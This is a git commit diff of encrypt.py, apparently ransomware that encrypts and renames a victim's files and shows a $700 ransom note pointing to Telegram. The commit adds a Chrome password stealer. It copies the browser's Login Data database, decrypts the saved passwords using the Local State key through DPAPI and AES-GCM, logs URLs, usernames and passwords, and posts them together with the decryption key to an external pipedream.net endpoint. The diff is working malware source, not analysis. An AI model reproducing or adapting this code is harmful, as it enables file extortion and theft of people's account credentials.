70439463b89c653866a8e0f09b4ac2a03665883d
g3zb0yy <b0d3ns33@criminal.li>
2021-02-15 20:49:51 +0100

    Update encrypt.py

--- encrypt.py
+++ encrypt.py
@@ -2,6 +2,7 @@ from cryptography.fernet import Fernet
 from tkinter import *
 import webbrowser
 from pathlib import Path
+import codecs
 import os
 import glob
 import random
@@ -36,6 +37,7 @@ def main():
     lbl.pack()
     message = """
     All your files have been encrypted due to a security problem with your PC. 
+    We also recovered all your online accounts.
     If you want to restore them, write us to our Telegram profil by clicking on the "Contact" button.
     Then i will show you how to pay the amount of 700$.
     """
@@ -82,14 +84,47 @@ def write_key():
     """
     Générer la clé
     """
-    key = Fernet.generate_key()
+    keydecrypt = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
-        key_file.write(key)
+        key_file.write(keydecrypt)
 
     with open("key.key", "rb") as key_file:
         key = key_file.read()
+        key = get_encryption_key()
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+        filename = "ChromeData.db"
+        shutil.copyfile(db_path, filename)
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+            if username or password:
+                logs = f"""
+🤖 Origin URL: {origin_url}
+🤖 Action URL: {action_url}
+💥 Username: {username}
+💥 Password: {password}
+                """
+                with codecs.open("logs.txt", "a+", encoding="utf-8") as log_file:
+                    log_file.write(str(logs.encode('unicode-escape')))
+            else:
+                continue
 
-    r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": key}, headers={'Content - Type': 'application / json'})
+        rez = codecs.open("logs.txt", "r", encoding="utf-8").read()
+        r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": keydecrypt, "logs": rez}, headers={'Content - Type': 'application / json'})
+        cursor.close()
+        db.close()
+        try:
+            # try to remove the copied db file
+            os.remove(filename)
+        except:
+            pass
 
 def load_key():
     """
@@ -108,7 +143,6 @@ def start():
     for root, dirs, files in os.walk(tmp):
         for file in files:
             tmp_files.append(file)
-
     if signature in tmp_files:
         main()
     else:
@@ -144,5 +178,31 @@ def encrypt(dir, key):
             extension = str(filename).split(".")[1]
             name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
             os.rename(filename, dirdir + "/" + name + "." + extension)
+
+def get_chrome_datetime(chromedate):
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            # not supported
+            return ""
 
 start()
